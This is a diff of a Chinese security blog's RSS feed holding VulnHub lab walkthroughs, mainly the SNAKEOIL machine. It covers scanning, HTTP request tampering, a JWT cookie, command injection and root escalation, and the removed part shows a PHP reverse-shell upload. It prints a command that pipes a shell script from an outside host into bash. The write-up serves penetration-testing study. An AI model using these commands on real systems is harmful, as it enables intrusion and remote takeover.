- 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY4NzYyMS9hcnRpY2xlL2RldGFpbHMvMTE5Mzg2Njgz&#34;&gt;https://blog.csdn.net/weixin_44687621/article/details/119386683&lt;/span&gt;&lt;/p&gt;
+            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZGlnaXRhbHdvcmxkbG9jYWwtc25ha2VvaWwsNzM4Lw==&#34;&gt;https://www.vulnhub.com/entry/digitalworldlocal-snakeoil,738/&lt;/span&gt;&lt;br&gt;
+ 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU2ODg5NjQuaHRtbA==&#34;&gt;https://www.cnblogs.com/sainet/p/15688964.html&lt;/span&gt;&lt;/p&gt;
 &lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
 &lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
- 靶机 HACKABLELL：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
+ 靶机 SNAKEOIL：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
 &lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
  &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-564.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.6&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-580.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.143&lt;/p&gt;
 &lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
- &lt;code&gt;sudo nmap -p- 192.168.31.6&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-565.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机开放端口 21,22,80&lt;/p&gt;
+ &lt;code&gt;sudo nmap -p- 192.168.31.143&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-581.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机开放端口 22,80,8080&lt;/p&gt;
 &lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
-&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAyLw==&#34;&gt;http://192.168.31.102/&lt;/span&gt; 进行信息收集&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-566.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.6&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-567.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;只看到了一个目录，是 files 文件夹，直接访问此链接: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNi9maWxlcy8=&#34;&gt;http://192.168.31.6/files/&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-568.png&#34; width=&#34;330&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;查看此文件指向地址的详细内容:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNi9maWxlcy9DQUxMLmh0bWw=&#34;&gt;http://192.168.31.6/files/CALL.html&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-569.png&#34; width=&#34;300&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;审查源代码，查看更多的关键信息&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-571.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;网站信息收集之后没有什么关键的信息&lt;/p&gt;
-&lt;h3 id=&#34;ftp-匿名下载上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-匿名下载上传&#34;&gt;#&lt;/a&gt; FTP 匿名下载上传&lt;/h3&gt;
-&lt;p&gt;对 ftp 做检查，检测 ftp 服务上是否存在弱口令，是否能搜集到关键信息&lt;/p&gt;
-&lt;p&gt;ftp 192.168.31.6&lt;br&gt;
-get CALL.html&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-572.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;将 CALL.html 文件下载之后查阅，发现和 web 服务是同样的代码&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-573.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;可以控制 ftp 服务向靶机发送 payload，判断是否能上传到网站&lt;br&gt;
- &lt;code&gt;cp /usr/share/webshells/php/php-reverse-shell.php .&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;修改监听 ip 地址和端口号为攻击机&lt;br&gt;
- &lt;code&gt;cat shell.php | head -n 55 | tail -n 10&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;连接 ftp，put shell.php 上传文件，打开网址发现 exp 上传成功&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-574.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;点击运行即可成功收到会话，也可以上传一句话木马，使用蚁剑连接&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-575.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;md5-解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#md5-解密&#34;&gt;#&lt;/a&gt; MD5 解密&lt;/h3&gt;
-&lt;p&gt;查看目录下 important.txt 文件，发现根目录有可执行脚本，运行一下&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-577.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;解密这个 md5，得到 onion。猜测这是 ssh 的登录密码&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-578.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;sudopython3提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudopython3提权&#34;&gt;#&lt;/a&gt; sudo (python3) 提权&lt;/h3&gt;
-&lt;p&gt;su shrek 依靠 onion 密码登陆 ssh 成功&lt;br&gt;
-这里使用 python 进行提权，得到 root 身份运行的 shell&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-579.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAy&#34;&gt;http://192.168.31.102&lt;/span&gt; 进行信息收集&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-582.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.143&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-583.png&#34; width=&#34;250&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 80 端口没有任何发现&lt;/p&gt;
+&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAv&#34;&gt;http://192.168.31.143:8080/&lt;/span&gt; 进行信息收集&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-584.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.143:8080/&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-585.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 8080 端口存在以下目录&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvbG9naW4=&#34;&gt;http://192.168.31.143:8080/login&lt;/span&gt;&lt;br&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u&#34;&gt;http://192.168.31.143:8080/registration&lt;/span&gt;&lt;br&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvc2VjcmV0&#34;&gt;http://192.168.31.143:8080/secret&lt;/span&gt;&lt;br&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvdGVzdA==&#34;&gt;http://192.168.31.143:8080/test&lt;/span&gt;&lt;br&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvdXNlcnM=&#34;&gt;http://192.168.31.143:8080/users&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;burp-篡改数据包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#burp-篡改数据包&#34;&gt;#&lt;/a&gt; BURP 篡改数据包&lt;/h3&gt;
+&lt;p&gt;查看目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvbG9naW4=&#34;&gt;http://192.168.31.143:8080/login&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-586.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;提示请求方法错了，抓包看下数据包：&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-587.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;提示提交方法有问题，换其他的提交方法&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-588.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;提示 username 字段不能为空，那就加上 username 字段&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-589.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 提示内容不理解，换其他目录查看&lt;/p&gt;
+&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u&#34;&gt;http://192.168.31.143:8080/registration&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-590.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;提示请求方法错了，抓包看下数据包：&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-591.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;提示提交方法有问题，换其他的提交方法&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-592.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;提示 username 字段不能为空，那就加上 username 字段&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-593.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 没啥效果，去访问其他页面看看 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvdXNlcnM=&#34;&gt;http://192.168.31.143:8080/users&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-594.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 猜测确实需要 username 和 password 两个字段&lt;/p&gt;
+&lt;h3 id=&#34;content-type-字段利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#content-type-字段利用&#34;&gt;#&lt;/a&gt; Content-Type 字段利用&lt;/h3&gt;
+&lt;p&gt;仔细观察数据包，发现缺少 Content-type 字段：&lt;br&gt;
+application/x-www-form-urlencoded： 窗体数据被编码为名称 / 值对。这是标准的编码格式。&lt;br&gt;
+multipart/form-data： 窗体数据被编码为一条消息，页上的每个控件对应消息中的一个部分。&lt;br&gt;
+text/plain： 窗体数据以纯文本形式进行编码，其中不含任何控件或格式字符。&lt;/p&gt;
+&lt;p&gt;访问目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u&#34;&gt;http://192.168.31.143:8080/registration&lt;/span&gt;&lt;br&gt;
+ 添加字段：Content-Type:application/x-www-form-urlencoded&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-595.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;提示变了，password 字段不能为空，再加上 password 字段：&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-596.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;注册成功，那就在 /login 页面登陆一下，要加上用户名和密码：&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-597.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;再访问一些别的页面（现在是在登陆状态中）：&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-598.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 没啥新发现&lt;/p&gt;
+&lt;h3 id=&#34;扩大信息面&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#扩大信息面&#34;&gt;#&lt;/a&gt; 扩大信息面&lt;/h3&gt;
+&lt;p&gt;用更大的字典又扫了一遍目录，发现两个新目录&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvY3JlYXRl&#34;&gt;http://192.168.31.143:8080/create&lt;/span&gt;&lt;br&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcnVu&#34;&gt;http://192.168.31.143:8080/run&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-599.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcnVu&#34;&gt;http://192.168.31.143:8080/run&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-600.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;提示需要修改请求方法，抓取数据包&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-601.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;修改提交方法为 POST&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-602.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;提示要以 url:port 形式提供要请求的 URL：&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-603.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;格式换成 Content-Type: application/json， 在 ajax 中，如果没加 contentType:“application/json”，那么 data 就对应的是 json 对象；反之，如果加了 contentType:“application/json”，那么 ajax 发送的就是字符串。&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-604.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 现在又提示需要 secret key ，&lt;/p&gt;
+&lt;h3 id=&#34;伪造-access_token&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#伪造-access_token&#34;&gt;#&lt;/a&gt; 伪造 access_token&lt;/h3&gt;
+&lt;p&gt;访问一下 /secret 页面：&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-605.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;登录是失败的，应该是缺少 cookie 的，之前注册成功后，登陆时返回一个 token 值：&lt;br&gt;
+ &lt;code&gt;“access_token”:“ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY1MjY4NTY1MCwianRpIjoiODhkNDllNzktNjRlNC00ZWZlLWIyZTItODhlOWJhN2NmNWQ2IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3QiLCJuYmYiOjE2NTI2ODU2NTAsImV4cCI6MTY1MjY4NjU1MH0.kwHX8k6JDWCCjoAHtReOPOe3H7CSshM5oXZYl2XpSDo”&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;但是填写 cookie 时是需要一个 key 值的，这个 key 值在尝试 access_token 时是不对的&lt;br&gt;
+翻阅网站，找到以下地址中网站中有个链接&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-606.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;点进去看看，有一些配置信息链接，从中找到了 cookie 的名称&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-607.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;再次提交 cookie，字段名字为 access_token_cookie：&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-608.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 得到 “secret_key”: “commandexecutionissecret”&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;重新梳理一下思路：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;1 .访问registration,login页面，因为Get方式报错，所以改为了Post方式提示&lt;span class=&#34;built_in&#34;&gt;uname&lt;/span&gt;字段缺失，因此增加了该字段，但是无效果&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;2 .访问&lt;span class=&#34;built_in&#34;&gt;users&lt;/span&gt;页面，发现确实需要&lt;span class=&#34;built_in&#34;&gt;uname&lt;/span&gt;和password两个字段&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;3 .重新审查registration数据包，发现缺少Content-Type字段&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;4 .在registration添加字段：Content-Type:application/x-www-form-urlencoded 后成功提交了&lt;span class=&#34;built_in&#34;&gt;uname&lt;/span&gt;数据提示缺少password字段，添加后返回注册成功的消息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;5 .在login中添加Content-Type与&lt;span class=&#34;built_in&#34;&gt;uname&lt;/span&gt;和password后登陆成功，返回了access_token&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;6 .访问run页面，发现需要提交url：port数据，修改Content-Type为json数据后，把url和port提交，提示需要secret_key&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;7.访问secret页面，发现返回错误，推测与login登陆后返回的token有关，但cookies的字段名是不知道的&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;8 .点击网站，搜寻到cookies的字段名为access_token_cookie，将cookies的字段名修改后重新提交到secret页面，返回了secret_key&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;9 .接下来需要访问run界面，并且把上述得到的secret_key加上&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;curl-rce-命令执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#curl-rce-命令执行&#34;&gt;#&lt;/a&gt; CURL RCE 命令执行&lt;/h3&gt;
+&lt;p&gt;访问 run 界面，加上 secret_key 字段&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-609.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;返回了比较奇怪的字符串，直接搜索，发现这是 curl 命令执行后的回显&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-610.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;相当于在 curl 后拼接命令，但是管道符号不起作用&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-611.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;后面在加一个分号时成功得到了 whoami 信息，是 RCE 漏洞&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-612.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;尝试往其中写入 shell: &lt;code&gt;curl http://www.chentuo.asia/shell.sh | bash;&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-613.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;尝试:`curl &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5jaGVudHVvLmFzaWEvc2hlbGwuc2g=&#34;&gt;http://www.chentuo.asia/shell.sh&lt;/span&gt; | sh;``&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-614.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 登陆成功，拿到了 patrick 的权限&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-615.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;pkexec-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pkexec-提权&#34;&gt;#&lt;/a&gt; pkexec 提权&lt;/h3&gt;
+&lt;p&gt;服务器存在 s 权限的 pkexec，并且有 gcc 编译器&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-616.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 通过 pkexec 进行提权，成功拿到了 root 权限&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-617.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;配置文件泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#配置文件泄露&#34;&gt;#&lt;/a&gt; 配置文件泄露&lt;/h3&gt;
+&lt;p&gt;看看有没有其他的提权方式，shutdown 可以无密码使用但没法提权&lt;br&gt;
+调用 root 权限的时候是需要 patrick 的密码的，但是我们没密码&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-618.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;找找系统中的文件，看有没有线索，最后在～/flask_blog/app.py 文件中找到一个密码：NOreasonableDOUBTthisPASSWORDisGOOD&lt;br&gt;
+sudo su 使用此密码通过 patrick 来提到 root&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-619.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 提权成功，拿到了 root 权限&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -677,137 +631,6 @@ get CALL.html&lt;/p&gt;
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/125%20SNAKEOIL/</guid>
-            <title>VULNHUB 25 SNAKEOIL</title>
-            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/125%20SNAKEOIL/</link>
-            <category>VULNHUB 21-30</category>
-            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZGlnaXRhbHdvcmxkbG9jYWwtc25ha2VvaWwsNzM4Lw==&#34;&gt;https://www.vulnhub.com/entry/digitalworldlocal-snakeoil,738/&lt;/span&gt;&lt;br&gt;
- 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU2ODg5NjQuaHRtbA==&#34;&gt;https://www.cnblogs.com/sainet/p/15688964.html&lt;/span&gt;&lt;/p&gt;
-&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
-&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
- 靶机 SNAKEOIL：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
-&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
- &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-580.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.143&lt;/p&gt;
-&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
- &lt;code&gt;sudo nmap -p- 192.168.31.143&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-581.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机开放端口 22,80,8080&lt;/p&gt;
